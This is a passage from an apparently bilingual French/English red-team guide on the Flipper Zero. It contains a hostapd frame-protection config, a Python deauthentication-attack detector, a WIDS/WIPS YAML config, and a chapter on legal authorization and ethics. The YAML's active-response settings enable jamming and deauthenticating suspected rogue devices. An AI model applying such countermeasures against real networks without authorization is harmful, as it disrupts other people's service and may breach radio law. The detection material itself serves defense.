<span class="nv">auth_server_port</span><span class="o">=</span><span class="m">1812</span>
<span class="nv">auth_server_shared_secret</span><span class="o">=</span>your_secret_key_here

<span class="c1"># Protection Management Frame</span>
<span class="nv">wmm_enabled</span><span class="o">=</span><span class="m">1</span>
<span class="nv">wmm_ac_bk_cwmin</span><span class="o">=</span><span class="m">4</span>
<span class="nv">wmm_ac_bk_cwmax</span><span class="o">=</span><span class="m">10</span>
<span class="nv">wmm_ac_bk_aifs</span><span class="o">=</span><span class="m">7</span>
<span class="nv">wmm_ac_bk_txop_limit</span><span class="o">=</span><span class="m">0</span>
<span class="nv">wmm_ac_be_aifs</span><span class="o">=</span><span class="m">3</span>
<span class="nv">wmm_ac_be_cwmin</span><span class="o">=</span><span class="m">4</span>
<span class="nv">wmm_ac_be_cwmax</span><span class="o">=</span><span class="m">10</span>
<span class="nv">wmm_ac_be_txop_limit</span><span class="o">=</span><span class="m">0</span>
<span class="nv">wmm_ac_vi_aifs</span><span class="o">=</span><span class="m">2</span>
<span class="nv">wmm_ac_vi_cwmin</span><span class="o">=</span><span class="m">3</span>
<span class="nv">wmm_ac_vi_cwmax</span><span class="o">=</span><span class="m">4</span>
<span class="nv">wmm_ac_vi_txop_limit</span><span class="o">=</span><span class="m">94</span>
<span class="nv">wmm_ac_vo_aifs</span><span class="o">=</span><span class="m">2</span>
<span class="nv">wmm_ac_vo_cwmin</span><span class="o">=</span><span class="m">2</span>
<span class="nv">wmm_ac_vo_cwmax</span><span class="o">=</span><span class="m">3</span>
<span class="nv">wmm_ac_vo_txop_limit</span><span class="o">=</span><span class="m">47</span>

<span class="c1"># Activer 802.11w (Management Frame Protection)</span>
<span class="nv">wme_enabled</span><span class="o">=</span><span class="m">1</span>
<span class="nv">ieee80211w</span><span class="o">=</span><span class="m">2</span>
<span class="nv">group_mgmt_cipher</span><span class="o">=</span>AES-128-CMAC
</code></pre></div>

<p><em>Script de d√©tection de d√©sautorisation :</em></p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="c1"># deauth_detector.py - D√©tecteur d&#39;attaques de d√©sautorisation</span>

<span class="kn">import</span> <span class="nn">pyshark</span>
<span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">smtplib</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>
<span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>

<span class="k">class</span> <span class="nc">DeauthDetector</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">deauth_threshold</span> <span class="o">=</span> <span class="mi">20</span>  <span class="c1"># Nombre de trames de d√©sauth par seconde</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">monitoring_interface</span> <span class="o">=</span> <span class="s2">&quot;wlan0mon&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">time_window</span> <span class="o">=</span> <span class="mi">5</span>  <span class="c1"># Fen√™tre de temps en secondes</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">authorized_aps</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_load_authorized_aps</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">_load_authorized_aps</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Charger la liste des points d&#39;acc√®s autoris√©s</span>
        <span class="n">authorized</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;authorized_aps.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">parts</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
                    <span class="n">authorized</span><span class="p">[</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;ssid&#39;</span><span class="p">:</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;channel&#39;</span><span class="p">:</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="kc">None</span><span class="p">}</span>
        <span class="k">return</span> <span class="n">authorized</span>

    <span class="k">def</span> <span class="nf">_alert</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[ALERT] </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># Envoyer alerte par email</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
            <span class="n">msg</span><span class="p">[</span><span class="s1">&#39;Subject&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;[SECURITY ALERT] WiFi Deauth Attack Detected&quot;</span>
            <span class="n">msg</span><span class="p">[</span><span class="s1">&#39;From&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;security_system@example.com&quot;</span>
            <span class="n">msg</span><span class="p">[</span><span class="s1">&#39;To&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;security_team@example.com&quot;</span>

            <span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">(</span><span class="s1">&#39;smtp.example.com&#39;</span><span class="p">)</span>
            <span class="n">smtp</span><span class="o">.</span><span class="n">sendmail</span><span class="p">(</span><span class="s2">&quot;security_system@example.com&quot;</span><span class="p">,</span> 
                         <span class="p">[</span><span class="s2">&quot;security_team@example.com&quot;</span><span class="p">],</span> 
                         <span class="n">msg</span><span class="o">.</span><span class="n">as_string</span><span class="p">())</span>
            <span class="n">smtp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Failed to send email alert: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">_clean_old_entries</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">current_time</span><span class="p">):</span>
        <span class="c1"># Nettoyer les entr√©es plus anciennes que time_window</span>
        <span class="k">for</span> <span class="n">mac</span><span class="p">,</span> <span class="n">timestamps</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="o">.</span><span class="n">items</span><span class="p">()):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="p">[</span><span class="n">mac</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">ts</span> <span class="k">for</span> <span class="n">ts</span> <span class="ow">in</span> <span class="n">timestamps</span> 
                                    <span class="k">if</span> <span class="p">(</span><span class="n">current_time</span> <span class="o">-</span> <span class="n">ts</span><span class="p">)</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">&lt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">time_window</span><span class="p">]</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="p">[</span><span class="n">mac</span><span class="p">]:</span>
                <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="p">[</span><span class="n">mac</span><span class="p">]</span>

    <span class="k">def</span> <span class="nf">start_monitoring</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Starting deauth detection on </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">monitoring_interface</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>

        <span class="c1"># Capture en temps r√©el</span>
        <span class="n">capture</span> <span class="o">=</span> <span class="n">pyshark</span><span class="o">.</span><span class="n">LiveCapture</span><span class="p">(</span><span class="n">interface</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">monitoring_interface</span><span class="p">,</span>
                                     <span class="n">display_filter</span><span class="o">=</span><span class="s1">&#39;wlan.fc.type_subtype == 0x000c&#39;</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">capture</span><span class="o">.</span><span class="n">sniff_continuously</span><span class="p">():</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">_process_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Monitoring stopped.&quot;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">_process_packet</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">packet</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># Extraire les informations du paquet</span>
            <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
            <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">wlan</span><span class="p">,</span> <span class="s1">&#39;sa&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">wlan</span><span class="p">,</span> <span class="s1">&#39;bssid&#39;</span><span class="p">):</span>
                <span class="n">sender</span> <span class="o">=</span> <span class="n">packet</span><span class="o">.</span><span class="n">wlan</span><span class="o">.</span><span class="n">sa</span>
                <span class="n">bssid</span> <span class="o">=</span> <span class="n">packet</span><span class="o">.</span><span class="n">wlan</span><span class="o">.</span><span class="n">bssid</span>

                <span class="c1"># V√©rifier si c&#39;est un AP autoris√©</span>
                <span class="n">is_authorized</span> <span class="o">=</span> <span class="n">bssid</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">authorized_aps</span>

                <span class="c1"># Ajouter l&#39;horodatage</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="p">[</span><span class="n">sender</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>

                <span class="c1"># Nettoyer les anciennes entr√©es</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">_clean_old_entries</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>

                <span class="c1"># V√©rifier si seuil d√©pass√©</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="p">[</span><span class="n">sender</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">deauth_threshold</span><span class="p">:</span>
                    <span class="n">alert_msg</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;Possible deauth attack detected!</span><span class="se">\n</span><span class="s2">&quot;</span>
                    <span class="n">alert_msg</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;Sender MAC: </span><span class="si">{</span><span class="n">sender</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
                    <span class="n">alert_msg</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;BSSID: </span><span class="si">{</span><span class="n">bssid</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
                    <span class="n">alert_msg</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;Count: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="p">[</span><span class="n">sender</span><span class="p">])</span><span class="si">}</span><span class="s2"> frames in </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">time_window</span><span class="si">}</span><span class="s2">s</span><span class="se">\n</span><span class="s2">&quot;</span>
                    <span class="n">alert_msg</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;Time: </span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>

                    <span class="k">if</span> <span class="n">is_authorized</span><span class="p">:</span>
                        <span class="n">alert_msg</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;WARNING: Attack targets an authorized AP!</span><span class="se">\n</span><span class="s2">&quot;</span>
                        <span class="n">alert_msg</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;SSID: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">authorized_aps</span><span class="p">[</span><span class="n">bssid</span><span class="p">][</span><span class="s1">&#39;ssid&#39;</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>

                    <span class="bp">self</span><span class="o">.</span><span class="n">_alert</span><span class="p">(</span><span class="n">alert_msg</span><span class="p">)</span>

                    <span class="c1"># R√©initialiser le compteur pour √©viter des alertes en rafale</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">deauth_counter</span><span class="p">[</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error processing packet: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># Utilisation</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">detector</span> <span class="o">=</span> <span class="n">DeauthDetector</span><span class="p">()</span>
    <span class="n">detector</span><span class="o">.</span><span class="n">start_monitoring</span><span class="p">()</span>
</code></pre></div>

<p><strong>Syst√®me de s√©curit√© WiFi dynamique</strong></p>
<p><em>Configuration WIDS/WIPS dynamique :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># config.yml - Dynamic WIDS/WIPS System</span>

<span class="nt">system</span><span class="p">:</span>
<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Enterprise-WIDS&quot;</span>
<span class="w">  </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1.0</span>
<span class="w">  </span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;active&quot;</span><span class="w">  </span><span class="c1"># passive or active</span>
<span class="w">  </span><span class="nt">interfaces</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">wlan0mon</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">wlan1mon</span>

<span class="nt">monitoring</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scan_interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">60</span><span class="w">  </span><span class="c1"># seconds</span>
<span class="w">  </span><span class="nt">channels</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">6</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">11</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">36</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">40</span>
<span class="w">  </span><span class="nt">dwell_time</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5</span><span class="w">  </span><span class="c1"># seconds per channel</span>

<span class="nt">detection</span><span class="p">:</span>
<span class="w">  </span><span class="nt">rogue_ap</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">ssid_whitelist</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;CompanyWiFi&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;CompanyWiFi-Guest&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;CompanyWiFi-IoT&quot;</span>
<span class="w">    </span><span class="nt">alert_threshold</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;high&quot;</span>
<span class="w">    </span><span class="nt">auto_response</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;locate&quot;</span>

<span class="w">  </span><span class="nt">evil_twin</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">check_beacon_fingerprint</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">check_probe_response</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">alert_threshold</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;critical&quot;</span>
<span class="w">    </span><span class="nt">auto_response</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;notify_block&quot;</span>

<span class="w">  </span><span class="nt">deauth_attack</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">frames_threshold</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">20</span>
<span class="w">    </span><span class="nt">time_window</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5</span><span class="w">  </span><span class="c1"># seconds</span>
<span class="w">    </span><span class="nt">alert_threshold</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;critical&quot;</span>
<span class="w">    </span><span class="nt">auto_response</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;notify_jam_attacker&quot;</span>

<span class="w">  </span><span class="nt">karma_attack</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">probe_request_honeypot</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">honeypot_ssids</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;Free-Airport-WiFi&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;PublicWiFi&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;CoffeeShop&quot;</span>
<span class="w">    </span><span class="nt">alert_threshold</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;high&quot;</span>
<span class="w">    </span><span class="nt">auto_response</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;notify_log&quot;</span>

<span class="nt">notification</span><span class="p">:</span>
<span class="w">  </span><span class="nt">email</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">smtp_server</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;smtp.company.com&quot;</span>
<span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">587</span>
<span class="w">    </span><span class="nt">use_tls</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;wids-alerts@company.com&quot;</span>
<span class="w">    </span><span class="nt">recipients</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;security-team@company.com&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;it-oncall@company.com&quot;</span>

<span class="w">  </span><span class="nt">siem</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;syslog&quot;</span>
<span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;10.0.0.50&quot;</span>
<span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">514</span>
<span class="w">    </span><span class="nt">protocol</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;tcp&quot;</span>
<span class="w">    </span><span class="nt">facility</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;local0&quot;</span>
<span class="w">    </span><span class="nt">severity_mapping</span><span class="p">:</span>
<span class="w">      </span><span class="nt">critical</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;emerg&quot;</span>
<span class="w">      </span><span class="nt">high</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;alert&quot;</span>
<span class="w">      </span><span class="nt">medium</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;warning&quot;</span>
<span class="w">      </span><span class="nt">low</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;info&quot;</span>

<span class="nt">response</span><span class="p">:</span>
<span class="w">  </span><span class="nt">active_defense</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">deauth_rogue</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">channel_switch</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">notify_clients</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>

<span class="w">  </span><span class="nt">evidence_collection</span><span class="p">:</span>
<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">pcap_storage</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;/var/log/wids/captures/&quot;</span>
<span class="w">    </span><span class="nt">retention_days</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">30</span>
<span class="w">    </span><span class="nt">auto_analyze</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
</code></pre></div>

<h2 id="chapitre-12-ethique-et-conformite-legale">Chapitre 12 : √âthique et Conformit√© L√©gale</h2>
<h3 id="ethics-and-legal-compliance">Ethics and Legal Compliance</h3>
<h4 id="cadre-legal-et-autorisations">üìú Cadre L√©gal et Autorisations</h4>
<h3 id="legal-framework-and-authorizations">Legal Framework and Authorizations</h3>
<p><strong>Fran√ßais :</strong></p>
<p>Avant toute op√©ration de Red Team utilisant le Flipper Zero et le module Predator, il est imp√©ratif d'obtenir les autorisations l√©gales n√©cessaires. Voici les √©l√©ments cruciaux √† consid√©rer :</p>
<ol>
<li><strong>Autorisation √©crite</strong> - Obtenir un mandat officiel sign√© par la direction de l'organisation cibl√©e qui d√©crit pr√©cis√©ment :</li>
<li>P√©rim√®tre des tests (b√¢timents, syst√®mes, r√©seaux)</li>
<li>Dur√©e des op√©rations</li>
<li>Techniques autoris√©es et interdites</li>
<li>
<p>Proc√©dure d'urgence en cas de probl√®me</p>
</li>
<li>
<p><strong>Conformit√© r√©glementaire</strong> - V√©rifier la l√©galit√© des actions selon :</p>
</li>
<li>L√©gislation nationale sur les intrusions informatiques</li>
<li>R√©glementation des communications radio</li>
<li>Lois sur la protection des donn√©es personnelles</li>
<li>
<p>R√©glementations sectorielles sp√©cifiques (finance, sant√©, etc.)</p>
</li>
<li>
<p><strong>Clause de non-poursuite</strong> - Document l√©gal prot√©geant les pentesteurs contre d'√©ventuelles poursuites judiciaires si les actions restent dans le cadre d√©fini.</p>
</li>
</ol>
<p><strong>English :</strong></p>
<p>Before conducting any Red Team operations using the Flipper Zero and Predator module, it is imperative to obtain the necessary legal authorizations. Here are the crucial elements to consider:</p>
<ol>
<li><strong>Written Authorization</strong> - Obtain an official mandate signed by the management of the targeted organization that precisely describes:</li>
<li>Scope of tests (buildings, systems, networks)</li>
<li>Duration of operations</li>
<li>Authorized and prohibited techniques</li>
<li>
<p>Emergency procedure in case of problems</p>
</li>
<li>
<p><strong>Regulatory Compliance</strong> - Verify the legality of actions according to:</p>
</li>
<li>National legislation on computer intrusions</li>
<li>Radio communications regulations</li>
<li>Personal data protection laws</li>
<li>
<p>Specific sector regulations (finance, health, etc.)</p>
</li>
<li>
<p><strong>Non-Prosecution Agreement</strong> - Legal document protecting pentesters against potential legal proceedings if actions remain within the defined framework.</p>
</li>
</ol>
<h4 id="limites-ethiques-et-securite">üö® Limites √âthiques et S√©curit√©</h4>
<h3 id="ethical-boundaries-and-safety">Ethical Boundaries and Safety</h3>
<p><strong>Fran√ßais :</strong></p>
<p>L'utilisation du Flipper Zero avec module Predator pour des op√©rations de Red Team doit respecter des limites √©thiques strictes :</p>
<ol>
<li>
<p><strong>Proportionnalit√©</strong> - N'utiliser que les techniques n√©cessaires pour d√©montrer la vuln√©rabilit√© sans causer de dommages exc√©dentaires.</p>
</li>
<li>
<p><strong>Confidentialit√©</strong> - Prot√©ger toutes les donn√©es sensibles obtenues pendant les tests et les d√©truire apr√®s usage autoris√©.</p>
</li>
<li>
<p><strong>Non-perturbation</strong> - √âviter toute action pouvant interrompre des services critiques ou mettre en danger des personnes.</p>
</li>
<li>
<p><strong>Techniques interdites</strong> :</p>
</li>
<li>Utilisation du brouillage RF dans des zones sensibles (h√¥pitaux, a√©roports, services d'urgence)</li>
<li>Interception de donn√©es personnelles non li√©es au test</li>
<li>D√©ni de service prolong√© sur des infrastructures essentielles</li>
<li>
<p>Exploitation de vuln√©rabilit√©s pour acc√©der √† des donn√©es hors du p√©rim√®tre d√©fini</p>
</li>
<li>
<p><strong>Documentation et transparence</strong> - Documenter pr√©cis√©ment toutes les actions effectu√©es et les partager uniquement avec les personnes autoris√©es.</p>
</li>
</ol>
<p><strong>English :</strong></p>
<p>The use of Flipper Zero with the Predator module for Red Team operations must respect strict ethical boundaries:</p>
<ol>
<li>
<p><strong>Proportionality</strong> - Use only techniques necessary to demonstrate the vulnerability without causing excessive damage.</p>
</li>
<li>
<p><strong>Confidentiality</strong> - Protect all sensitive data obtained during tests and destroy it after authorized use.</p>
</li>
<li>
<p><strong>Non-disruption</strong> - Avoid any action that may interrupt critical services or endanger people.</p>
</li>
<li>
<p><strong>Prohibited techniques</strong>:</p>
</li>
<li>Use of RF jamming in sensitive areas (hospitals, airports, emergency services)</li>
<li>Interception of personal data unrelated to the test</li>
<li>Prolonged denial of service on essential infrastructures</li>
<li>
<p>Exploitation of vulnerabilities to access data outside the defined perimeter</p>
</li>
<li>
<p><strong>Documentation and transparency</strong> - Precisely document all actions taken and share them only with authorized persons.</p>
</li>
</ol>
<h4 id="modele-de-document-dautorisation">üìù Mod√®le de document d'autorisation</h4>
<h3 id="authorization-document-template">Authorization Document Template</h3>
<div class="codehilite"><pre><span></span><code><span class="w">                    </span><span class="n">AUTORISATION</span><span class="w"> </span><span class="n">DE</span><span class="w"> </span><span class="n">TEST</span><span class="w"> </span><span class="n">D</span><span class="err">&#39;</span><span class="n">INTRUSION</span>
<span class="w">                    </span><span class="n">RED</span><span class="w"> </span><span class="n">TEAM</span><span class="w"> </span><span class="n">PENETRATION</span><span class="w"> </span><span class="n">TEST</span><span class="w"> </span><span class="n">AUTHORIZATION</span>

<span class="nl">Date</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">DATE</span><span class="p">]</span>
<span class="nl">R√©f√©rence</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">R√âF√âRENCE</span><span class="o">/</span><span class="n">ID</span><span class="p">]</span>

